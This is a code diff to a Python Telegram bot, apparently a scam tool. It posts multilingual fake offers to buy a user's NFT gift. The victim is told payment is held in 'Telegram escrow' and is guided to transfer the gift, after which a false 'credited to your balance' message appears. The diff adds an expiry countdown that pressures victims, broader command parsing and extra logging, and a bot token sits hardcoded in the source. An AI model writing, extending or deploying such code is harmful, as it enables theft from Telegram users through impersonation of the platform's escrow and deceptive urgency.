@@ -1,4 +1,4 @@
-import asyncio, re, random, string, logging
+import asyncio, re, random, string, logging, time
 from aiogram import Bot, Dispatcher, F
 from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
@@ -9,15 +9,21 @@ from aiogram.types import (
 )
 from aiogram.exceptions import TelegramBadRequest
 
-logging.basicConfig(level=logging.INFO)
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s %(levelname)s %(message)s",
+)
 
 BOT_TOKEN = "8516600626:AAHkWQ2mdcqPfzR5gNe_a5uMfZB13y7P8-A"
+OFFER_TTL = 6 * 3600  # 6 часов в секундах
+TIMER_TICK = 60  # обновление таймера раз в минуту
 
 bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher()
 
 GIFT_RE = re.compile(r"t\.me/nft/([A-Za-z]+?)-(\d+)")
 LANG_TAGS = {"ru", "ukr", "eng", "cn", "en", "uk", "zh"}
+CMD_WORDS = {"buy", "sell", "offer", "deal", "купить", "продать"}
 
 E_STAR, E_GEM, E_CHECK = (
     "6028338546736107668",
@@ -38,17 +44,19 @@ T = {
     "ru": {
         "o1": "Пользователь предлагает вам",
         "of": "за подарок",
-        "ot": "Оффер действителен ещё 6 ч.",
+        "ot_h": "Оффер действителен ещё <b>{h} ч.</b>",
+        "ot_hm": "Оффер действителен ещё <b>{h} ч. {m} мин.</b>",
+        "ot_m": "Оффер действителен ещё <b>{m} мин.</b>",
+        "ot_exp": "Срок оффера истёк.",
         "accept": "Принять",
         "decline": "Отклонить",
         "transfer": "Передать NFT",
         "confirm": "Подтвердить передачу",
-        "ok": "Ок",
         "alert": (
             "⚠️ Следуйте инструкции внимательно.\n\n"
             "Если вы передадите другой подарок или ошибётесь при подтверждении, "
             "Telegram не вернёт средства и не зачислит оплату автоматически.\n\n"
-            "Если вы ознакомились — нажмите кнопку «Ок»."
+            "Нажмите «Принять» ещё раз, чтобы продолжить."
         ),
         "instr_title": "Покупатель зарезервировал",
         "instr_via": "через эскроу-систему Telegram.",
@@ -67,21 +75,25 @@ T = {
         "done_b": "Ордер #{oid} выполнен.",
         "done_credit": "зачислено на баланс.",
         "declined": "Оффер отклонён.",
+        "expired": "⌛ Срок оффера истёк.",
+        "order_lbl": "Ордер",
     },
     "ukr": {
         "o1": "Користувач пропонує вам",
         "of": "за подарунок",
-        "ot": "Пропозиція дійсна ще 6 год.",
+        "ot_h": "Пропозиція дійсна ще <b>{h} год.</b>",
+        "ot_hm": "Пропозиція дійсна ще <b>{h} год. {m} хв.</b>",
+        "ot_m": "Пропозиція дійсна ще <b>{m} хв.</b>",
+        "ot_exp": "Термін пропозиції минув.",
         "accept": "Прийняти",
         "decline": "Відхилити",
         "transfer": "Передати NFT",
         "confirm": "Підтвердити передачу",
-        "ok": "Ок",
         "alert": (
             "⚠️ Дотримуйтесь інструкції уважно.\n\n"
             "Якщо ви передасте інший подарунок або помилитесь при підтвердженні, "
             "Telegram не поверне кошти і не зарахує оплату автоматично.\n\n"
-            "Якщо ви ознайомились — натисніть кнопку «Ок»."
+            "Натисніть «Прийняти» ще раз, щоб продовжити."
         ),
         "instr_title": "Покупець зарезервував",
         "instr_via": "через ескроу-систему Telegram.",
@@ -100,21 +112,25 @@ T = {
         "done_b": "Ордер #{oid} виконано.",
         "done_credit": "зараховано на баланс.",
         "declined": "Пропозицію відхилено.",
+        "expired": "⌛ Термін пропозиції минув.",
+        "order_lbl": "Ордер",
     },
     "eng": {
         "o1": "A user offers you",
         "of": "for the gift",
-        "ot": "Offer valid for another 6 h.",
+        "ot_h": "Offer valid for another <b>{h} h.</b>",
+        "ot_hm": "Offer valid for another <b>{h} h. {m} min.</b>",
+        "ot_m": "Offer valid for another <b>{m} min.</b>",
+        "ot_exp": "Offer expired.",
         "accept": "Accept",
         "decline": "Decline",
         "transfer": "Transfer NFT",
         "confirm": "Confirm transfer",
-        "ok": "OK",
         "alert": (
             "⚠️ Follow the instructions carefully.\n\n"
             "If you send the wrong gift or confirm by mistake, Telegram will not "
             "return the funds and will not credit the payment automatically.\n\n"
-            "If you understand — press «OK»."
+            "Press «Accept» again to continue."
         ),
         "instr_title": "The buyer has reserved",
         "instr_via": "via Telegram escrow.",
@@ -133,21 +149,25 @@ T = {
         "done_b": "Order #{oid} fulfilled.",
         "done_credit": "credited to your balance.",
         "declined": "Offer declined.",
+        "expired": "⌛ Offer expired.",
+        "order_lbl": "Order",
     },
     "cn": {
         "o1": "用户向您提出报价",
         "of": "购买礼物",
-        "ot": "报价还有效 6 小时。",
+        "ot_h": "报价还有效 <b>{h} 小时</b>",
+        "ot_hm": "报价还有效 <b>{h} 小时 {m} 分</b>",
+        "ot_m": "报价还有效 <b>{m} 分</b>",
+        "ot_exp": "报价已过期。",
         "accept": "接受",
         "decline": "拒绝",
         "transfer": "转移 NFT",
         "confirm": "确认转移",
-        "ok": "确定",
         "alert": (
             "⚠️ 请严格按照说明操作。\n\n"
             "如果您发送了错误的礼物或错误地确认，Telegram 将不会退还资金，"
             "也不会自动记入付款。\n\n"
-            "如果您已了解，请点击「确定」。"
+            "请再次点击「接受」以继续。"
         ),
         "instr_title": "买家已预留",
         "instr_via": "通过 Telegram 托管系统。",
@@ -165,12 +185,27 @@ T = {
         "done_b": "订单 #{oid} 已完成。",
         "done_credit": "已记入余额。",
         "declined": "报价已拒绝。",
+        "expired": "⌛ 报价已过期。",
+        "order_lbl": "订单",
     },
 }
 
 
 def t(l, k):
     return T.get(l, T["ru"]).get(k, T["ru"][k])
+
+
+def fmt_remaining(expires_at: float, lang: str) -> str:
+    left = int(expires_at - time.time())
+    if left <= 0:
+        return t(lang, "ot_exp")
+    h, rem = divmod(left, 3600)
+    m, _ = divmod(rem, 60)
+    if h > 0 and m > 0:
+        return t(lang, "ot_hm").format(h=h, m=m)
+    if h > 0:
+        return t(lang, "ot_h").format(h=h)
+    return t(lang, "ot_m").format(m=max(m, 1))
 
 
 def get_recipient(bcid: str) -> tuple[str | None, int | None]:
@@ -186,9 +221,15 @@ def parse_command(text):
     parts = text.strip().split()
     if not parts:
         return None
-    if parts[0].startswith("/"):
+
+    # дропаем префикс команды: /buy .buy !buy @bot buy — всё в утиль
+    first = parts[0].lstrip("/.!")
+    if first.lower() in CMD_WORDS or parts[0].startswith(("/", ".", "!")):
         parts = parts[1:]
     if parts and parts[0].startswith("@"):
+        parts = parts[1:]
+    # на случай ".buy" где первый токен сдроплен, но следом ещё "buy"
+    if parts and parts[0].lower() in CMD_WORDS:
         parts = parts[1:]
     if not parts:
         return None
@@ -198,8 +239,9 @@ def parse_command(text):
 
     for p in parts:
         low = p.lower()
-        if link is None and (p.startswith("http") or p.startswith("t.me")):
-            link = p
+        if link is None and (p.startswith("http") or p.startswith("t.me") or "t.me/" in p):
+            # нормализуем: добавим https:// если нет
+            link = p if p.startswith("http") else f"https://{p}"
             continue
         if low in LANG_TAGS:
             if low == "ru":
@@ -238,12 +280,11 @@ def parse_gift(link):
 
 
 def amount_only(amount, currency):
-    """Без слова 'Звёзд' — только число и премиум-эмодзи."""
     icon = em(E_GEM, "💎") if currency == "GRAM" else em(E_STAR, "⭐")
     return f'<b>{amount}</b> {icon}'
 
 
-def build_offer_short(amount, currency, gift_name, gift_num, lang, url=None):
+def build_offer_short(amount, currency, gift_name, gift_num, lang, expires_at, url=None):
     gift_part = (
         f'<b><a href="{url}">{gift_name} #{gift_num}</a></b>'
         if url else f'<b>{gift_name} #{gift_num}</b>'
@@ -251,18 +292,17 @@ def build_offer_short(amount, currency, gift_name, gift_num, lang, url=None):
     return (
         f'{t(lang, "o1")} {amount_only(amount, currency)} '
         f'{t(lang, "of")} {gift_part}.\n\n'
-        f'{t(lang, "ot")}'
+        f'{fmt_remaining(expires_at, lang)}'
     )
 
 
-def build_instruction(amount, currency, gift_name, gift_num, order_id, lang, username, user_id, nft_url):
+def build_instruction(amount, currency, gift_name, gift_num, order_id, lang, username, user_id, nft_url, expires_at):
     rec = f"@{username}" if username else (
         f'<a href="tg://user?id={user_id}">id{user_id}</a>' if user_id else "—"
     )
     gift_link = f'<a href="{nft_url}">{gift_name} #{gift_num}</a>'
     return (
-        f'<b>{t(lang, "or")}</b> #{order_id}\n\n' if False else
-        f'<i>Ордер #{order_id}</i>\n\n'
+        f'<i>{t(lang, "order_lbl")} #{order_id}</i>\n\n'
         f'{t(lang, "instr_title")} {amount_only(amount, currency)} '
         f'{t(lang, "instr_via")} {t(lang, "instr_body")}\n\n'
         f'<b>{t(lang, "instr_head")}</b>\n'
@@ -270,7 +310,8 @@ def build_instruction(amount, currency, gift_name, gift_num, order_id, lang, use
         f'{t(lang, "instr_s2")} {gift_link}\n'
         f'{t(lang, "instr_s3")}\n\n'
         f'{t(lang, "instr_foot_1")} {amount_only(amount, currency)} '
-        f'{t(lang, "instr_foot_2")}'
+        f'{t(lang, "instr_foot_2")}\n\n'
+        f'{fmt_remaining(expires_at, lang)}'
     )
 
 
@@ -284,6 +325,10 @@ def build_accepted(amount, currency, order_id, lang):
 
 def build_declined(lang):
     return f'❌ {t(lang, "declined")}'
+
+
+def build_expired(lang):
+    return t(lang, "expired")
 
 
 def kb_offer(lang, order_id):
@@ -342,7 +387,6 @@ def extract_gift_ref(message: Message):
 
 
 async def mark_gift_transferred(message: Message, bcid: str):
-    """Фиксируем факт передачи подарка — ставим флаг в PENDING, но не редактируем сразу."""
     ref = extract_gift_ref(message)
     if not ref:
         return False
@@ -367,11 +411,89 @@ async def ensure_owner(bcid: str):
             "username": bc.user.username,
             "user_id": bc.user.id,
         }
-        logging.info(
-            f"biz_conn FETCHED: bcid={bcid} user_id={bc.user.id} username={bc.user.username}"
-        )
+        logging.info(f"biz_conn FETCHED: bcid={bcid} user={bc.user.username}")
     except Exception as e:
         logging.error(f"get_business_connection failed: {e}")
+
+
+async def render_offer(meta: dict, order_id: str, with_preview: bool):
+    """Перерисовать оффер в текущем состоянии (OFFER/ALERT_SHOWN или INSTRUCTION)."""
+    lang = meta["lang"]
+    state = meta["state"]
+    try:
+        if state in ("OFFER", "ALERT_SHOWN"):
+            text = build_offer_short(
+                meta["amount"], meta["currency"],
+                meta["gift_name"], meta["gift_num"],
+                lang, meta["expires_at"],
+                meta["nft_url"] if with_preview else None,
+            )
+            kb = kb_offer(lang, order_id)
+            lpo = LinkPreviewOptions(
+                is_disabled=not with_preview,
+                prefer_large_media=True,
+                show_above_text=True,
+            )
+        else:  # INSTRUCTION
+            text = build_instruction(
+                meta["amount"], meta["currency"],
+                meta["gift_name"], meta["gift_num"],
+                order_id, lang,
+                meta["username"], meta["user_id"],
+                meta["nft_url"], meta["expires_at"],
+            )
+            kb = kb_instruction(lang, order_id, meta["username"], meta["user_id"])
+            lpo = LinkPreviewOptions(is_disabled=True)
+
+        await bot.edit_message_text(
+            chat_id=meta["chat_id"],
+            message_id=meta["msg_id"],
+            text=text,
+            reply_markup=kb,
+            business_connection_id=meta["bcid"],
+            link_preview_options=lpo,
+        )
+    except TelegramBadRequest as e:
+        # "message is not modified" — норм, пропускаем
+        if "not modified" not in str(e):
+            logging.error(f"render_offer edit: {e}")
+
+
+async def timer_loop():
+    """Фоновый таск: обновляет таймер и чистит протухшие офферы."""
+    while True:
+        try:
+            now = time.time()
+            dead = []
+            for order_id, meta in list(PENDING.items()):
+                if meta["expires_at"] <= now:
+                    dead.append(order_id)
+                    continue
+                # сохраняем состояние "with_preview": OFFER показывается с превью после 1.5s edit
+                with_preview = meta.get("preview_shown", False) and meta["state"] in ("OFFER", "ALERT_SHOWN")
+                await render_offer(meta, order_id, with_preview)
+                await asyncio.sleep(0.05)  # лёгкая пауза между правками
+
+            for order_id in dead:
+                meta = PENDING.pop(order_id, None)
+                if not meta:
+                    continue
+                GIFT_INDEX.pop((meta["bcid"], meta["gift_slug"], meta["gift_num"]), None)
+                try:
+                    await bot.edit_message_text(
+                        chat_id=meta["chat_id"],
+                        message_id=meta["msg_id"],
+                        text=build_expired(meta["lang"]),
+                        reply_markup=None,
+                        business_connection_id=meta["bcid"],
+                        link_preview_options=LinkPreviewOptions(is_disabled=True),
+                    )
+                except Exception as e:
+                    logging.error(f"expire edit: {e}")
+        except Exception as e:
+            logging.error(f"timer_loop: {e}")
+
+        await asyncio.sleep(TIMER_TICK)
 
 
 @dp.business_connection()
@@ -382,9 +504,7 @@ async def handle_business_connection(bc: BusinessConnection):
             "username": user.username,
             "user_id": user.id,
         }
-        logging.info(
-            f"biz_conn ON: bcid={bc.id} user_id={user.id} username={user.username}"
-        )
+        logging.info(f"biz_conn ON: bcid={bc.id} user={user.username}")
     else:
         BIZ_OWNERS.pop(bc.id, None)
         logging.info(f"biz_conn OFF: bcid={bc.id}")
@@ -398,7 +518,6 @@ async def handle_business_message(message: Message):
 
     await ensure_owner(bcid)
 
-    # фиксируем передачу подарка (но не финализируем — ждём "Подтвердить")
     if await mark_gift_transferred(message, bcid):
         return
 
@@ -407,6 +526,7 @@ async def handle_business_message(message: Message):
 
     parsed = parse_command(message.text)
     if not parsed:
+        logging.info(f"not parsed: {message.text!r}")
         return
 
     username, user_id = get_recipient(bcid)
@@ -417,15 +537,19 @@ async def handle_business_message(message: Message):
     link, amount, currency, lang = parsed
     gift = parse_gift(link)
     if not gift:
+        logging.info(f"gift not parsed from: {link}")
         return
     gift_name, gift_num, slug = gift
     nft_url = f"https://t.me/nft/{slug}-{gift_num}"
     order_id = oid()
+    expires_at = time.time() + OFFER_TTL
+
+    logging.info(f"new offer {order_id}: {gift_name}#{gift_num} for {amount} {currency}")
 
     try:
         sent = await bot.send_message(
             chat_id=message.chat.id,
-            text=build_offer_short(amount, currency, gift_name, gift_num, lang),
+            text=build_offer_short(amount, currency, gift_name, gift_num, lang, expires_at),
             reply_markup=kb_offer(lang, order_id),
             business_connection_id=bcid,
             link_preview_options=LinkPreviewOptions(is_disabled=True),
@@ -457,15 +581,18 @@ async def handle_business_message(message: Message):
         "user_id": user_id,
         "state": "OFFER",
         "gift_transferred": False,
+        "expires_at": expires_at,
+        "preview_shown": False,
     }
     GIFT_INDEX[(bcid, slug, gift_num)] = order_id
 
-    await asyncio.sleep(1.5)
+    # ШАГ 2: добавляем превью
+    await asyncio.sleep(0.8)
     try:
         await bot.edit_message_text(
             chat_id=message.chat.id,
             message_id=sent.message_id,
-            text=build_offer_short(amount, currency, gift_name, gift_num, lang, nft_url),
+            text=build_offer_short(amount, currency, gift_name, gift_num, lang, expires_at, nft_url),
             reply_markup=kb_offer(lang, order_id),
             business_connection_id=bcid,
             link_preview_options=LinkPreviewOptions(
@@ -474,8 +601,9 @@ async def handle_business_message(message: Message):
                 show_above_text=True,
             ),
         )
+        PENDING[order_id]["preview_shown"] = True
     except TelegramBadRequest as e:
-        logging.error(f"edit error: {e}")
+        logging.error(f"preview edit: {e}")
 
 
 @dp.edited_business_message()
@@ -486,9 +614,17 @@ async def handle_edited_business_message(message: Message):
     await mark_gift_transferred(message, bcid)
 
 
+def resolve_bcid(cb: CallbackQuery, meta: dict | None) -> str | None:
+    if meta:
+        return meta["bcid"]
+    msg = cb.message
+    return getattr(msg, "business_connection_id", None) if msg else None
+
+
 @dp.callback_query(F.data.startswith("decline:"))
 async def on_decline(cb: CallbackQuery):
     order_id = cb.data.split(":", 1)[1]
+    logging.info(f"CB decline: order={order_id} from={cb.from_user.id}")
     meta = PENDING.get(order_id)
     if not meta:
         await cb.answer()
@@ -513,19 +649,18 @@ async def on_decline(cb: CallbackQuery):
 @dp.callback_query(F.data.startswith("accept:"))
 async def on_accept(cb: CallbackQuery):
     order_id = cb.data.split(":", 1)[1]
+    logging.info(f"CB accept: order={order_id} from={cb.from_user.id}")
     meta = PENDING.get(order_id)
     if not meta:
         await cb.answer()
         return
     lang = meta["lang"]
 
-    # первый клик — показываем alert с предупреждением
     if meta["state"] == "OFFER":
         meta["state"] = "ALERT_SHOWN"
         await cb.answer(t(lang, "alert"), show_alert=True)
         return
 
-    # второй клик (после "Ок" в alert) — редактируем в инструкцию
     if meta["state"] == "ALERT_SHOWN":
         try:
             await bot.edit_message_text(
@@ -536,7 +671,7 @@ async def on_accept(cb: CallbackQuery):
                     meta["gift_name"], meta["gift_num"],
                     order_id, lang,
                     meta["username"], meta["user_id"],
-                    meta["nft_url"],
+                    meta["nft_url"], meta["expires_at"],
                 ),
                 reply_markup=kb_instruction(lang, order_id, meta["username"], meta["user_id"]),
                 business_connection_id=meta["bcid"],
@@ -554,6 +689,7 @@ async def on_accept(cb: CallbackQuery):
 @dp.callback_query(F.data.startswith("confirm:"))
 async def on_confirm(cb: CallbackQuery):
     order_id = cb.data.split(":", 1)[1]
+    logging.info(f"CB confirm: order={order_id} from={cb.from_user.id}")
     meta = PENDING.get(order_id)
     if not meta:
         await cb.answer()
@@ -581,15 +717,23 @@ async def on_confirm(cb: CallbackQuery):
     await cb.answer()
 
 
+@dp.callback_query()
+async def on_any_cb(cb: CallbackQuery):
+    """Фоллбэк: ловим ВСЕ callback'и для диагностики."""
+    logging.warning(f"UNHANDLED CB: data={cb.data!r} from={cb.from_user.id}")
+    await cb.answer()
+
+
 @dp.message(CommandStart())
 async def cmd_start(message: Message):
     await message.answer(
         "🎁 Пришли ссылку на подарок, язык и сумму, например:\n"
-        "https://t.me/nft/PreciousPeach-664 ru 21222 STARS"
+        ".buy https://t.me/nft/PreciousPeach-664 ru 21222"
     )
 
 
 async def main():
+    asyncio.create_task(timer_loop())
     await dp.start_polling(
         bot,
         allowed_updates=[
